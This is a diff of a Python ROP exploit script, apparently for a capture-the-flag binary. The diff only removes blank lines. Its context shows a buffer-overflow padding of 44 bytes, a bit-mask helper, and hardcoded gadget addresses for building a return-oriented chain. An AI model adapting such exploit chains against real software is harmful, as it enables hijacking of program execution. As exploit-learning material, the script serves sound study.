@@ -88,7 +88,6 @@ def big_endian(number):
 def get_mask(target, value=0xb0bababa):
     target_bits = bin(ord(target))[2:]
     value_bits  = bin(value)[2:]
-
     mask_bits   = ''
 
     while(target_bits):
@@ -97,7 +96,6 @@ def get_mask(target, value=0xb0bababa):
             target_bits = target_bits[:-1]
         else:
             mask_bits = '0' + mask_bits
-
         value_bits = value_bits[:-1]
 
     while(value_bits):
@@ -111,11 +109,8 @@ def get_mask(target, value=0xb0bababa):
 
 # Parts of the chain
 fill_buffer   = b"X"*44
-
 print_file    = little_endian(0x080483d0)
-
 memory4string = 0x0804a018
-
 pop_swap_cx   = little_endian(0x08048558)
 pop_bp        = little_endian(0x080485bb)
 prepare_dx    = little_endian(0x08048543)
